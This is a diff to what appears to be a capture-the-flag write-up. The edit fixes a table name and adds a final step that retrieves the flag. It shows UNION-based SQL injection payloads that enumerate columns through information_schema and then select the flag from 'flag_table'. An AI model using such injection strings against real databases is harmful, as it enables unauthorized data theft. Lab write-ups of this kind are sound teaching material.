@@ -137,11 +137,22 @@ Find the tables in Database
 
 
 
-Find the coulmns in **Flag** table
+Find the coulmns in **Flag_table**
 ```
 ' union select column_name, 2, 3 ,4 from information_schema.columns where table_name = 'flag_table' #
 ```
 ![image](https://github.com/user-attachments/assets/e029b62d-99b6-421d-82cd-3fe6ed6ed37e)
+
+
+Find the **FLAG** 
+```
+' union select flag, 2, 3, 4 from flag_table # 
+```
+![스크린샷 2025-05-29 172917](https://github.com/user-attachments/assets/785e3dc8-bf25-40da-9916-c4ba81273669)
+
+
+
+
 
 
 
